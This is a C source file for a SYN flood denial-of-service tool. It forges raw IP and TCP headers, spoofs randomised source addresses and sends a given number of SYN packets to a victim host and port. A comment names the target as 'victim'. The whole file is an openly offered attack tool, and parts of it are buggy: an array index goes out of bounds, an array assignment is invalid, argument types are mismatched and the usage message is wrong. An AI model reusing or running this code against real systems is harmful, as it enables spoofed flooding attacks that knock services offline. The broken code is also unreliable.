#include	<sys/socket.h>	/* basic socket definitions */
#include	<netinet/in.h>	/* sockaddr_in{} and other Internet defns */
#include	<stdio.h>
#include	<arpa/inet.h>
#include 	<unistd.h>
#include	<netinet/tcp.h>
#include	<netinet/ip.h>
#include	<string.h>
#include	<stdlib.h>
#include 	<sys/types.h>
#include    <sys/wait.h>

char * rangeIP(char p[],char buf[]);
time_t time(time_t *t);
void tostring(char str[], int num);

	struct ipheader {
     unsigned char      iph_ihl:4, /* Little-endian */
                        iph_ver:4;
     unsigned char      iph_tos;
     unsigned short int iph_len;
     unsigned short int iph_ident;
     unsigned short int iph_offset;
     unsigned char      iph_ttl;
     unsigned char      iph_protocol;
     unsigned short int iph_chksum;
     unsigned int       iph_sourceip;
     unsigned int       iph_destip;
    };

    /* Structure of the TCP header */
    struct tcpheader {
     unsigned short int   tcph_srcport;
     unsigned short int   tcph_destport;
     unsigned int             tcph_seqnum;
     unsigned int             tcph_acknum;
     unsigned short int
	   	   tcph_ns:1,
           tcph_reser:3,     /*reserved 3 bits*/
		   tcph_hlen:4,      /*length of tcp header in 32-bit words*/
           tcph_fin:1,
           tcph_syn:1,
           tcph_rst:1,
           tcph_psh:1,
           tcph_ack:1,
		   tcph_urg:1,
		   tcph_ece:1,
		   tcph_cwr:1;
     unsigned short int   tcph_win;
     unsigned short int   tcph_chksum;
     unsigned short int   tcph_urgptr;
    };

unsigned short caculateCheckSum(unsigned short *buf, int numwords)
{
	unsigned long sum;
	for (sum=0;numwords>0;numwords=numwords-2)
		sum=sum+*buf++; //calculate the sum of each 16 bit value within the header except the checksum
	sum=(sum & 0xffff)+(sum>>16);
	sum +=(sum>>16);
	return (unsigned short)(~sum);

}

/*
    96 bit (12 bytes) pseudo header needed for tcp header checksum calculation
*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

/* range a.b.c.d */

char * rangeIP(char IpAddr[],char buf[])
   {

	srand (time(NULL));
   	char *token=NULL;
	char *a[3];
   	char temp[32]="";
   	char temp3[32];
   	int j=0,num,num2;
   	strcpy(temp3,IpAddr);
   	token=strtok(temp3,".");

   	while(token != NULL)
   	{
   		a[j]=token;
   		token=strtok(NULL,".");
   		j++;
   	}
   	num=rand()%253+1;
   	num2=rand()%252+2;
   	snprintf(a[3],4,"%d",num);
   	//snprintf(a[2],4,"%d",num2);
 	printf("a[2-3] %s\n",a[3],a[2]);
  	printf("temp inside iprange is %s\n",temp);
   	strcat(temp,a[0]);
	strcat(temp,".");
	strcat(temp,a[1]);
	strcat(temp,".");
	strcat(temp,a[2]);
	strcat(temp,".");
	strcat(temp,a[3]);
	strcpy(buf,temp);

	return buf;
	}

void tostring(char str[], int num)
{
    int i, rem, len = 0, n;
    n = num;
    while (n != 0)
    {
        len++;
        n /= 10;
    }
    for (i = 0; i < len; i++)
    {
        rem = num % 10;
        num = num / 10;
        str[len - (i + 1)] = rem + '0';
    }
    str[len] = '\0';
}


char * TcpSyn(char * sourceIP,char * sourcePort, char * destIP, char * destPort,char * buf)
{
	char datagram[1024],*pseudogram;
	struct ipheader *iph=buf;
	struct tcpheader *tcph=buf + sizeof(struct ipheader);
	struct sockaddr_in sin;

	sin.sin_family=AF_INET;
	sin.sin_port=htons(destPort); //convert from host byte order to network byte order
	sin.sin_addr.s_addr=inet_addr(destIP);


	iph->iph_ihl=5;
	iph->iph_ver=4;
	iph->iph_tos=0;
	iph->iph_len=sizeof(struct ipheader)+sizeof(struct tcpheader);
	iph->iph_ident = htons(54321);
	iph->iph_offset=0;
	iph->iph_ttl=255;
	iph->iph_protocol=6; //tcp layer
	iph->iph_chksum=caculateCheckSum((unsigned short *) buf, iph->iph_len);

	iph->iph_sourceip = inet_addr (sourceIP);
	iph->iph_destip = sin.sin_addr.s_addr;
	tcph->tcph_srcport = htons (sourcePort);
	tcph->tcph_destport = htons (destPort);
	tcph->tcph_seqnum = 0;
	tcph->tcph_acknum = 0;
	tcph->tcph_hlen=5;
	tcph->tcph_reser=0;
	tcph->tcph_ns=0;
	tcph->tcph_fin=0;
	tcph->tcph_ece=0;
	tcph->tcph_rst=0;
	tcph->tcph_psh=0;
	tcph->tcph_ack=0;
	tcph->tcph_urg=0;
	tcph->tcph_syn=1;
	tcph->tcph_cwr=0;
	tcph->tcph_win=htons(65535);
	tcph->tcph_chksum=0;
	tcph->tcph_urgptr=0;

	//Now the TCP checksum
	 struct pseudo_header psh;
	 psh.source_address = inet_addr( sourceIP );
	 psh.dest_address = sin.sin_addr.s_addr;
	 psh.placeholder = 0;
	 psh.protocol = IPPROTO_TCP;
	 psh.tcp_length = htons(sizeof(struct tcpheader));

	 int psize = sizeof(struct pseudo_header) + sizeof(struct tcpheader);
	 pseudogram = malloc(psize);
	 memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	 memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcpheader));
	 tcph->tcph_chksum = caculateCheckSum( (unsigned short*) pseudogram , psize);

	 return buf;

}



// send syn flooding to victim from same source ip but different source port

int main(int argc, char *argv[])
{

	if(argc != 6)
	{
		printf("Invalid parameters!\n");
		printf("Usage: %s <dest ip address> <dest ip port> \n",argv[0]);
		exit(-1);
	}

		int	sockfd,len;
		char datagram[1024];
		char ip[32],newip[32];
		len=sizeof(struct ipheader)+sizeof(struct tcpheader);
		struct sockaddr_in sin;
		sin.sin_family=AF_INET;
		sin.sin_port=htons(argv[4]); //convert from host byte order to network byte order
		sin.sin_addr.s_addr=inet_addr(argv[3]);
		unsigned int sourcePort=atoi(argv[2]);
		unsigned int destPort=atoi(argv[4]);
        int i,k;
        k=atoi(argv[5]);
		strcpy(ip,argv[1]);
		printf("sourceIp is %s \n",ip);

	   	   while(k)
	   	   {

			    char *test=rangeIP(ip,newip);
			    datagram="";
			    sourcePort=sourcePort+1;
			    printf("ki is %d",k);
			    printf("newip and ip %s %s \n",newip,ip);
			    strcpy(datagram,TcpSyn(newip,sourcePort,argv[3],destPort,datagram));
			    if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) < 0)
					printf("create socket error\n");
			  	int tmp = 1;

				const int *val = &tmp;

				if(setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)
				{

				printf("Error: setsockopt() - Cannot set HDRINCL!\n");

				/* If something wrong, just exit */

				exit(-1);

				}

				else
					printf("OK, using your own header!\n");

				if(sendto(sockfd,datagram,len,0,(struct sockaddr *) &sin,sizeof (sin)) < 0)
					printf("sendto() error!!!.\n");
				else
					printf("Flooding %s at %s... from %s at %d\n", argv[3],argv[4],newip,&sourcePort);
				close(sockfd);
				k=k-1;
				printf("child finished\n");

	}



}

